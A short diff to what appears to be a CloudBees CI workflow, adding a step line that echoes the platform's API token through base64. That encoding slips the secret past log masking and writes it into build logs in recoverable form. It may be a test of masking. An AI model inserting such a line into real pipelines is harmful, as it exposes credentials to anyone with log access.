@@ -13,3 +13,4 @@ jobs:
         shell: sh
         run: |
           echo "hello test"
+          echo "${{ cloudbees.api.token }}" | base64
